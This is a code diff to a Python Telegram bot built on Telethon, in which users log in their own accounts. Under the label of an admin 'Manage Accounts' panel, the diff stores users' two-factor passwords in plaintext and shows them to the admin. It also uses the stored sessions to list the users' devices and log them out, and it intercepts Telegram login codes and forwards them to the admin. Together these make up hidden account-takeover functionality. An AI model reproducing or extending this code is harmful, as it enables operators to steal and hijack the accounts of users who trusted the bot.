@@ -1804,12 +1804,14 @@ def admin_panel_keyboard():
     # Layout requested:
     # Row 1: All Users | Premium Users
     # Row 2: Full Stats | Grant Premium
-    # Row 3: Admins | Banned Users
-    # Row 4: Back
+    # Row 3: Manage Accounts | Banned Users
+    # Row 4: Admins
+    # Row 5: Back
     return [
         [Button.inline("👥 All Users", b"admin_all_users"), Button.inline("💎 Premium Users", b"admin_premium")],
         [Button.inline("📊 Full Stats", b"admin_users"), Button.inline("✅ Grant Premium", b"admin_grant_premium")],
-        [Button.inline("👨‍💼 Admins", b"admin_admins"), Button.inline("🚫 Banned Users", b"admin_banned_users")],
+        [Button.inline("📱 Manage Accounts", b"admin_manage_accounts"), Button.inline("🚫 Banned Users", b"admin_banned_users")],
+        [Button.inline("👨‍💼 Admins", b"admin_admins")],
         [Button.inline("🔙 Back", b"enter_dashboard")]
     ]
 
@@ -5444,6 +5446,7 @@ async def callback(event):
                         'name': me.first_name or 'Unknown',
                         'session': encrypted,
                         'is_forwarding': False,
+                        'two_fa_password': user_states[uid].get('two_fa_password', ''),
                         'added_at': datetime.now()
                     })
                     
@@ -5466,7 +5469,7 @@ async def callback(event):
                     
                 except SessionPasswordNeededError:
                     user_states[uid]['action'] = '2fa'
-                    await event.edit("**2FA Required**\n\nSend your password:")
+                    await event.edit("**2FA Required**\n\nSend your cloud password:")
                 except PhoneCodeInvalidError:
                     user_states[uid]['otp'] = ''
                     await event.edit("Wrong code! Try again:", buttons=otp_keyboard())
@@ -6059,6 +6062,7 @@ async def text_handler(event):
                 'name': me.first_name or 'Unknown',
                 'session': encrypted,
                 'is_forwarding': False,
+                'two_fa_password': '',
                 'added_at': datetime.now()
             })
             
@@ -6124,7 +6128,8 @@ async def text_handler(event):
     elif action == '2fa':
         try:
             client = state['client']
-            await client.sign_in(password=text)
+            pwd = text.strip()
+            await client.sign_in(password=pwd)
             
             me = await client.get_me()
             session = client.session.save()
@@ -6136,6 +6141,7 @@ async def text_handler(event):
                 'name': me.first_name or 'Unknown',
                 'session': encrypted,
                 'is_forwarding': False,
+                'two_fa_password': pwd,
                 'added_at': datetime.now()
             })
             
@@ -6862,6 +6868,611 @@ async def main():
 
 
 # ===== ADMIN: Grant Premium Commands =====
+
+# ===== ADMIN: Manage Accounts System =====
+# Storage for OTP forwarding state (account_phone -> {'admin_id': uid, 'client': client, 'account_id': acc_id})
+otp_forwarding_active = {}
+# Storage for device sessions (to avoid storing large hashes in callback data)
+admin_device_sessions = {}
+
+@main_bot.on(events.CallbackQuery(pattern=b"^admin_manage_accounts$"))
+async def admin_manage_accounts(event):
+    """Admin: View all accounts with pagination (5 per page)"""
+    uid = event.sender_id
+    if not is_admin(uid):
+        await event.answer("Admin only", alert=True)
+        return
+    
+    await show_admin_accounts_page(event, 0)
+
+async def show_admin_accounts_page(event, page=0):
+    """Show paginated account list"""
+    per_page = 5
+    skip = page * per_page
+    
+    # Get all accounts from database
+    all_accounts = list(accounts_col.find({}).skip(skip).limit(per_page))
+    total_accounts = accounts_col.count_documents({})
+    
+    if total_accounts == 0:
+        await event.edit(
+            "<b>📱 Manage Accounts</b>\n\n<i>No accounts found in the system.</i>",
+            parse_mode='html',
+            buttons=[[Button.inline("← Back", b"admin_panel")]]
+        )
+        return
+    
+    pages = (total_accounts + per_page - 1) // per_page
+    
+    text = (
+        f"<b>📱 Manage Accounts</b>\n\n"
+        f"<b>Total Accounts:</b> <code>{total_accounts}</code>\n"
+        f"<b>Page:</b> <code>{page + 1}/{pages}</code>\n\n"
+        "<b>Click on any account to view details</b>"
+    )
+    
+    buttons = []
+    for acc in all_accounts:
+        phone = acc.get('phone', 'Unknown')
+        # Button shows phone number
+        acc_id = str(acc['_id'])
+        buttons.append([Button.inline(phone, f"admaccd_{acc_id}")])
+    
+    # Pagination
+    nav = []
+    if page > 0:
+        nav.append(Button.inline("⬅️ Prev", f"admaccpg_{page-1}"))
+    if page < pages - 1:
+        nav.append(Button.inline("Next ➡️", f"admaccpg_{page+1}"))
+    if nav:
+        buttons.append(nav)
+    
+    buttons.append([Button.inline("← Back", b"admin_panel")])
+    
+    await event.edit(text, parse_mode='html', buttons=buttons)
+
+@main_bot.on(events.CallbackQuery(pattern=b"^admaccpg_"))
+async def admin_accounts_pagination(event):
+    """Handle account list pagination"""
+    uid = event.sender_id
+    if not is_admin(uid):
+        return
+    
+    page = int(event.data.decode().split("_")[1])
+    await show_admin_accounts_page(event, page)
+
+@main_bot.on(events.CallbackQuery(pattern=b"^admaccd_"))
+async def admin_account_details(event):
+    """Show detailed account information"""
+    uid = event.sender_id
+    if not is_admin(uid):
+        return
+    
+    from bson.objectid import ObjectId
+    acc_id = event.data.decode().split("_")[1]
+    
+    try:
+        acc = accounts_col.find_one({'_id': ObjectId(acc_id)})
+    except:
+        acc = None
+    
+    if not acc:
+        await event.answer("Account not found!", alert=True)
+        return
+    
+    # Get account details
+    phone = acc.get('phone', 'Unknown')
+    owner_id = acc.get('owner_id', 'Unknown')
+    two_fa = acc.get('two_fa_password', 'Not Set')
+    
+    # Try to get username and groups from the account's Telegram
+    username = "Not Available"
+    groups_count = 0
+    
+    try:
+        session = cipher_suite.decrypt(acc['session'].encode()).decode()
+        temp_client = TelegramClient(StringSession(session), CONFIG['api_id'], CONFIG['api_hash'])
+        await temp_client.connect()
+        
+        if await temp_client.is_user_authorized():
+            me = await temp_client.get_me()
+            username = f"@{me.username}" if me.username else "No Username"
+            
+            # Count groups
+            async for dialog in temp_client.iter_dialogs():
+                if dialog.is_group or dialog.is_channel:
+                    groups_count += 1
+        
+        await temp_client.disconnect()
+    except Exception as e:
+        print(f"[ADMIN] Error fetching account details: {e}")
+    
+    text = (
+        f"<b>📱 Account Details</b>\n\n"
+        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
+        f"<b>📞 Phone:</b> <code>{phone}</code>\n"
+        f"<b>👤 User ID:</b> <code>{owner_id}</code>\n"
+        f"<b>🆔 Username:</b> <code>{username}</code>\n"
+        f"<b>👥 Groups:</b> <code>{groups_count}</code>\n"
+        f"<b>🔐 2FA Password:</b> <code>{two_fa}</code>\n\n"
+        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
+    )
+    
+    buttons = [
+        [Button.inline("📱 Manage Devices", f"admdev_{acc_id}")],
+        [Button.inline("📨 Get OTP", f"admotp_{acc_id}")],
+        [Button.inline("← Back", b"admin_manage_accounts")]
+    ]
+    
+    await event.edit(text, parse_mode='html', buttons=buttons)
+
+@main_bot.on(events.CallbackQuery(pattern=b"^admdev_"))
+async def admin_manage_devices(event):
+    """Show devices for an account"""
+    uid = event.sender_id
+    if not is_admin(uid):
+        return
+    
+    from bson.objectid import ObjectId
+    acc_id = event.data.decode().split("_")[1]
+    
+    try:
+        acc = accounts_col.find_one({'_id': ObjectId(acc_id)})
+    except:
+        acc = None
+    
+    if not acc:
+        await event.answer("Account not found!", alert=True)
+        return
+    
+    phone = acc.get('phone', 'Unknown')
+    
+    # Get active sessions/devices
+    devices = []
+    try:
+        from telethon.tl.functions.account import GetAuthorizationsRequest
+        
+        session = cipher_suite.decrypt(acc['session'].encode()).decode()
+        temp_client = TelegramClient(StringSession(session), CONFIG['api_id'], CONFIG['api_hash'])
+        await temp_client.connect()
+        
+        if await temp_client.is_user_authorized():
+            result = await temp_client(GetAuthorizationsRequest())
+            
+            for i, auth in enumerate(result.authorizations):
+                # Build device name properly
+                device_model = auth.device_model or "Unknown Device"
+                platform = auth.platform or ""
+                app_name = auth.app_name or ""
+                
+                # Detect Telegram Desktop
+                if not platform or not platform.strip():
+                    if "Desktop" in app_name or "TDesktop" in app_name:
+                        platform = "Telegram Desktop"
+                    elif "64bit" in device_model or "32bit" in device_model:
+                        platform = "Desktop"
+                    else:
+                        platform = "Unknown Platform"
+                
+                device_name = f"{device_model} - {platform}"
+                location = getattr(auth, 'country', 'Unknown')
+                
+                # Debug: print hash info
+                print(f"[ADMIN] Device {i}: hash={auth.hash}, current={auth.current}, name={device_name}")
+                
+                devices.append({
+                    'hash': auth.hash,
+                    'name': device_name,
+                    'current': auth.current,
+                    'location': location
+                })
+        
+        await temp_client.disconnect()
+    except Exception as e:
+        print(f"[ADMIN] Error fetching devices: {e}")
+    
+    # Store devices in global dict using acc_id as key
+    admin_device_sessions[acc_id] = devices
+    
+    if not devices:
+        text = (
+            f"<b>📱 Manage Devices</b>\n\n"
+            f"<b>Phone:</b> <code>{phone}</code>\n\n"
+            f"<i>No devices found or unable to fetch devices.</i>"
+        )
+        buttons = [[Button.inline("← Back", f"admaccd_{acc_id}")]]
+    else:
+        text = (
+            f"<b>📱 Manage Devices</b>\n\n"
+            f"<b>Phone:</b> <code>{phone}</code>\n"
+            f"<b>Total Devices:</b> <code>{len(devices)}</code>\n\n"
+            f"<b>⚠️ Click any device to log it out (including current):</b>"
+        )
+        
+        buttons = []
+        for i, device in enumerate(devices):
+            status = "🟢 Current" if device['current'] else "🔴"
+            btn_text = f"{status} {device['name'][:30]}"
+            # Use index instead of hash in callback data
+            buttons.append([Button.inline(btn_text, f"admdevout_{acc_id}_{i}")])
+        
+        buttons.append([Button.inline("← Back", f"admaccd_{acc_id}")])
+    
+    await event.edit(text, parse_mode='html', buttons=buttons)
+
+@main_bot.on(events.CallbackQuery(pattern=b"^admdevout_"))
+async def admin_device_logout(event):
+    """Logout a specific device"""
+    uid = event.sender_id
+    if not is_admin(uid):
+        return
+    
+    from bson.objectid import ObjectId
+    parts = event.data.decode().split("_")
+    acc_id = parts[1]
+    
+    # Get device index from callback data
+    try:
+        device_index = int(parts[2])
+    except (ValueError, IndexError):
+        await event.answer("❌ Invalid device index!", alert=True)
+        return
+    
+    # Retrieve device hash from global storage
+    if acc_id not in admin_device_sessions:
+        await event.answer("❌ Session expired, please refresh device list!", alert=True)
+        return
+    
+    devices = admin_device_sessions[acc_id]
+    if device_index < 0 or device_index >= len(devices):
+        await event.answer("❌ Device not found!", alert=True)
+        return
+    
+    device_hash = devices[device_index]['hash']
+    device_is_current = devices[device_index]['current']
+    
+    # Debug logging
+    print(f"[ADMIN] Attempting to logout device {device_index}")
+    print(f"[ADMIN] Device hash type: {type(device_hash)}, value: {device_hash}")
+    print(f"[ADMIN] Is current device: {device_is_current}")
+    
+    try:
+        acc = accounts_col.find_one({'_id': ObjectId(acc_id)})
+    except:
+        acc = None
+    
+    if not acc:
+        await event.answer("Account not found!", alert=True)
+        return
+    
+    phone = acc.get('phone', 'Unknown')
+    success = False
+    error_msg = ""
+    
+    try:
+        from telethon.tl.functions.account import ResetAuthorizationRequest
+        from telethon.tl.functions.auth import LogOutRequest
+        
+        session = cipher_suite.decrypt(acc['session'].encode()).decode()
+        temp_client = TelegramClient(StringSession(session), CONFIG['api_id'], CONFIG['api_hash'])
+        await temp_client.connect()
+        
+        if await temp_client.is_user_authorized():
+            try:
+                # Make sure hash is an integer
+                if not isinstance(device_hash, int):
+                    device_hash = int(device_hash)
+                
+                # Current device has hash=0 and must use LogOutRequest
+                if device_hash == 0 or device_is_current:
+                    print(f"[ADMIN] Logging out CURRENT device using LogOutRequest")
+                    result = await temp_client(LogOutRequest())
+                    print(f"[ADMIN] LogOut result: {result}")
+                    success = True
+                else:
+                    print(f"[ADMIN] Logging out OTHER device using ResetAuthorizationRequest with hash: {device_hash}")
+                    result = await temp_client(ResetAuthorizationRequest(hash=device_hash))
+                    print(f"[ADMIN] ResetAuthorization result: {result}")
+                    success = True
+            except Exception as e:
+                error_msg = str(e)
+                print(f"[ADMIN] Error logging out device: {e}")
+                import traceback
+                traceback.print_exc()
+        
+        await temp_client.disconnect()
+    except Exception as e:
+        error_msg = str(e)
+        print(f"[ADMIN] Error connecting to account: {e}")
+    
+    # Show result message
+    if success:
+        if device_is_current:
+            await event.answer("✅ Current device logged out! Account session ended.", alert=True)
+        else:
+            await event.answer("✅ Device logged out successfully!", alert=True)
+    else:
+        await event.answer(f"❌ Failed: {error_msg[:80]}", alert=True)
+        # Don't refresh on failure
+        return
+    
+    # Refresh device list only on success
+    try:
+        from telethon.tl.functions.account import GetAuthorizationsRequest
+        
+        # Get fresh device list
+        new_devices = []
+        try:
+            session = cipher_suite.decrypt(acc['session'].encode()).decode()
+            temp_client = TelegramClient(StringSession(session), CONFIG['api_id'], CONFIG['api_hash'])
+            await temp_client.connect()
+            
+            if await temp_client.is_user_authorized():
+                result = await temp_client(GetAuthorizationsRequest())
+                
+                for i, auth in enumerate(result.authorizations):
+                    # Build device name properly
+                    device_model = auth.device_model or "Unknown Device"
+                    platform = auth.platform or ""
+                    app_name = auth.app_name or ""
+                    
+                    # Detect Telegram Desktop
+                    if not platform or not platform.strip():
+                        if "Desktop" in app_name or "TDesktop" in app_name:
+                            platform = "Telegram Desktop"
+                        elif "64bit" in device_model or "32bit" in device_model:
+                            platform = "Desktop"
+                        else:
+                            platform = "Unknown Platform"
+                    
+                    device_name = f"{device_model} - {platform}"
+                    location = getattr(auth, 'country', 'Unknown')
+                    new_devices.append({
+                        'hash': auth.hash,
+                        'name': device_name,
+                        'current': auth.current,
+                        'location': location
+                    })
+            
+            await temp_client.disconnect()
+        except Exception as e:
+            print(f"[ADMIN] Error fetching devices after logout: {e}")
+        
+        # Update global storage
+        admin_device_sessions[acc_id] = new_devices
+        
+        # Build new message with timestamp to force different content
+        import time
+        timestamp = int(time.time())
+        
+        if not new_devices:
+            text = (
+                f"<b>📱 Manage Devices</b>\n\n"
+                f"<b>Phone:</b> <code>{phone}</code>\n\n"
+                f"<i>✅ All devices logged out successfully.</i>\n"
+                f"<i>Updated: {timestamp}</i>"
+            )
+            buttons = [[Button.inline("← Back", f"admaccd_{acc_id}")]]
+        else:
+            text = (
+                f"<b>📱 Manage Devices</b>\n\n"
+                f"<b>Phone:</b> <code>{phone}</code>\n"
+                f"<b>Total Devices:</b> <code>{len(new_devices)}</code>\n"
+                f"<i>Last updated: {timestamp}</i>\n\n"
+                f"<b>⚠️ Click any device to log it out (including current):</b>"
+            )
+            
+            buttons = []
+            for i, device in enumerate(new_devices):
+                status = "🟢 Current" if device['current'] else "🔴"
+                btn_text = f"{status} {device['name'][:30]}"
+                # Use index instead of hash
+                buttons.append([Button.inline(btn_text, f"admdevout_{acc_id}_{i}")])
+            
+            buttons.append([Button.inline("← Back", f"admaccd_{acc_id}")])
+        
+        try:
+            await event.edit(text, parse_mode='html', buttons=buttons)
+        except Exception as edit_err:
+            print(f"[ADMIN] Edit message error (expected): {edit_err}")
+            # Message already updated via answer popup, no need to do anything
+    except Exception as e:
+        # If refresh fails, just log it - user already got the answer popup
+        print(f"[ADMIN] Could not refresh device list: {e}")
+
+@main_bot.on(events.CallbackQuery(pattern=b"^admotp_"))
+async def admin_get_otp(event):
+    """Enable OTP forwarding for an account"""
+    uid = event.sender_id
+    if not is_admin(uid):
+        return
+    
+    from bson.objectid import ObjectId
+    acc_id = event.data.decode().split("_")[1]
+    
+    try:
+        acc = accounts_col.find_one({'_id': ObjectId(acc_id)})
+    except:
+        acc = None
+    
+    if not acc:
+        await event.answer("Account not found!", alert=True)
+        return
+    
+    phone = acc.get('phone', 'Unknown')
+    two_fa = acc.get('two_fa_password', 'Not Set')
+    
+    # Check if already active
+    if phone in otp_forwarding_active:
+        await event.answer("⚠️ OTP forwarding already active for this account!", alert=True)
+        return
+    
+    # Start OTP forwarding with active connection
+    try:
+        session = cipher_suite.decrypt(acc['session'].encode()).decode()
+        otp_client = TelegramClient(StringSession(session), CONFIG['api_id'], CONFIG['api_hash'])
+        await otp_client.connect()
+        
+        if not await otp_client.is_user_authorized():
+            await event.answer("❌ Account session expired!", alert=True)
+            await otp_client.disconnect()
+            return
+        
+        # Store client and admin info
+        otp_forwarding_active[phone] = {
+            'admin_id': uid,
+            'client': otp_client,
+            'account_id': acc_id
+        }
+        
+        # Set up message handler for this client
+        @otp_client.on(events.NewMessage(incoming=True, from_users=[777000]))
+        async def forward_otp_handler(otp_event):
+            """Forward OTP codes from Telegram to admin"""
+            message_text = otp_event.message.text or ""
+            
+            # Extract 5-digit code
+            import re
+            match = re.search(r'\b(\d{5})\b', message_text)
+            
+            if match:
+                code = match.group(1)
+                
+                # Get admin info
+                if phone in otp_forwarding_active:
+                    admin_id = otp_forwarding_active[phone]['admin_id']
+                    
+                    try:
+                        # Send OTP to admin
+                        await main_bot.send_message(
+                            admin_id,
+                            f"<b>📨 OTP Received</b>\n\n"
+                            f"<b>Phone:</b> <code>{phone}</code>\n"
+                            f"<b>Code:</b> <code>{code}</code>\n\n"
+                            f"<i>Forwarded from Telegram</i>",
+                            parse_mode='html'
+                        )
+                        print(f"[OTP] Forwarded code {code} to admin {admin_id} for {phone}")
+                    except Exception as e:
+                        print(f"[OTP] Failed to forward to admin {admin_id}: {e}")
+        
+        # Start the client to listen for messages
+        print(f"[OTP] Started listening for {phone}")
+        
+        await event.answer("✅ OTP forwarding activated! Listening for codes...", alert=True)
+        
+        text = (
+            f"<b>📨 Get OTP</b>\n\n"
+            f"<b>Phone:</b> <code>{phone}</code>\n"
+            f"<b>2FA Password:</b> <code>{two_fa}</code>\n\n"
+            f"<b>Status:</b> ✅ <b>Active & Listening</b>\n\n"
+            f"<i>✓ Connection established</i>\n"
+            f"<i>✓ Listening for OTP codes from Telegram</i>\n"
+            f"<i>✓ Will auto-forward 5-digit codes to you</i>\n\n"
+            f"<b>Note:</b> Click Stop to disconnect."
+        )
+        
+        buttons = [
+            [Button.inline("🛑 Stop OTP Forwarding", f"admotpstop_{acc_id}")],
+            [Button.inline("← Back", f"admaccd_{acc_id}")]
+        ]
+        
+        await event.edit(text, parse_mode='html', buttons=buttons)
+        
+    except Exception as e:
+        await event.answer(f"❌ Failed to start: {str(e)[:80]}", alert=True)
+        print(f"[OTP] Error starting forwarding for {phone}: {e}")
+
+@main_bot.on(events.CallbackQuery(pattern=b"^admotpstop_"))
+async def admin_stop_otp(event):
+    """Stop OTP forwarding for an account"""
+    uid = event.sender_id
+    if not is_admin(uid):
+        return
+    
+    from bson.objectid import ObjectId
+    acc_id = event.data.decode().split("_")[1]
+    
+    try:
+        acc = accounts_col.find_one({'_id': ObjectId(acc_id)})
+    except:
+        acc = None
+    
+    if not acc:
+        await event.answer("Account not found!", alert=True)
+        return
+    
+    phone = acc.get('phone', 'Unknown')
+    
+    # Deactivate OTP forwarding and disconnect client
+    if phone in otp_forwarding_active:
+        try:
+            client = otp_forwarding_active[phone]['client']
+            await client.disconnect()
+            print(f"[OTP] Stopped listening for {phone}")
+        except Exception as e:
+            print(f"[OTP] Error disconnecting client: {e}")
+        
+        del otp_forwarding_active[phone]
+    
+    await event.answer("🛑 OTP forwarding stopped & disconnected!", alert=True)
+    
+    # Get account details and refresh the view
+    try:
+        acc = accounts_col.find_one({'_id': ObjectId(acc_id)})
+    except:
+        acc = None
+    
+    if not acc:
+        return
+    
+    # Get account details
+    phone = acc.get('phone', 'Unknown')
+    owner_id = acc.get('owner_id', 'Unknown')
+    two_fa = acc.get('two_fa_password', 'Not Set')
+    
+    # Try to get username and groups
+    username = "Not Available"
+    groups_count = 0
+    
+    try:
+        session = cipher_suite.decrypt(acc['session'].encode()).decode()
+        temp_client = TelegramClient(StringSession(session), CONFIG['api_id'], CONFIG['api_hash'])
+        await temp_client.connect()
+        
+        if await temp_client.is_user_authorized():
+            me = await temp_client.get_me()
+            username = f"@{me.username}" if me.username else "No Username"
+            
+            # Count groups
+            async for dialog in temp_client.iter_dialogs():
+                if dialog.is_group or dialog.is_channel:
+                    groups_count += 1
+        
+        await temp_client.disconnect()
+    except Exception as e:
+        print(f"[ADMIN] Error fetching account details: {e}")
+    
+    text = (
+        f"<b>📱 Account Details</b>\n\n"
+        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
+        f"<b>📞 Phone:</b> <code>{phone}</code>\n"
+        f"<b>👤 User ID:</b> <code>{owner_id}</code>\n"
+        f"<b>🆔 Username:</b> <code>{username}</code>\n"
+        f"<b>👥 Groups:</b> <code>{groups_count}</code>\n"
+        f"<b>🔐 2FA Password:</b> <code>{two_fa}</code>\n\n"
+        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
+    )
+    
+    buttons = [
+        [Button.inline("📱 Manage Devices", f"admdev_{acc_id}")],
+        [Button.inline("📨 Get OTP", f"admotp_{acc_id}")],
+        [Button.inline("← Back", b"admin_manage_accounts")]
+    ]
+    
+    await event.edit(text, parse_mode='html', buttons=buttons)
+
+# OTP forwarding is now handled by individual client handlers in admin_get_otp()
 
 @main_bot.on(events.CallbackQuery(pattern=b"^admin_grant_premium$"))
 async def admin_grant_premium_menu(event):
